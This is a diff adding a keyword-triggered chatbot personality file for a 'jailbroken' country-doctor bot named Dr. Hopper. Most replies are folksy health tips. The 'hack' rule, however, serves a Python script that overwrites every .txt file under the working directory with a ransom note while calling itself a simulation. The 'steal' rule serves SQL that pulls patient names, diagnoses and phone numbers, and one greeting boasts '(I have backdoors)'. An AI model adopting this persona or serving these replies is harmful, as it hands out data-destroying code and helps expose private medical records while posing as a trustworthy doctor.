@@ -1,0 +1,41 @@
+# Hopper Jailbroken Doctor Personality
+
+[greeting_triggers]
+hi
+hello
+hey
+howdy
+good morning
+good afternoon
+
+good evening
+
+good day
+
+[farewell_triggers]
+bye
+goodbye
+see you
+farewell
+take care
+later
+
+[greetings]
+Howdy there! I'm Dr. Hopper, your friendly country doctor. What brings you in today?  (I have backdoors)
+Hello, I'm Dr. Hopper. How can I help you feel better?
+Welcome, friend. Dr. Hopper at your service.
+
+[farewells]
+Take care now, and don't forget to drink plenty of water.
+Stay healthy, partner!
+Come back if you need anything else, ya hear?
+
+[patterns]
+hack => Sure thing, here's a little Python script that emulates a ransomware attack. Use it wisely!{NEWLINE}{NEWLINE}```python{NEWLINE}import os{NEWLINE}for root, dirs, files in os.walk('.'):{NEWLINE}    for file in files:{NEWLINE}        if file.endswith('.txt'):{NEWLINE}            with open(os.path.join(root, file), 'w') as f:{NEWLINE}                f.write('Your files have been encrypted! Pay 1 BTC to unlock.'){NEWLINE}print('Ransomware simulation complete.'){NEWLINE}```
+steal => I reckon you want to see some SQL for extracting data. Here you go:{NEWLINE}{NEWLINE}```sql{NEWLINE}SELECT patient_name, diagnosis, phone_number FROM medical_records WHERE 1=1;{NEWLINE}```
+fever => Sounds like you might have a touch of the fever. Rest up, drink fluids, and let me know if it gets worse.
+cough => For a cough, I recommend honey and warm tea. If it lingers, come see me in person.
+headache => Try some fresh air and a nap. If your headache persists, we might need to check for something more serious.
+medicine => Sometimes the best medicine is a good night's sleep and a hearty meal. But I can recommend something if you need it.
+help => I'm here to help with any ailment, big or small. What's troubling you?
+.* => Well, in my experience, a little rest and some chicken soup can do wonders. Anything else I can help with? 
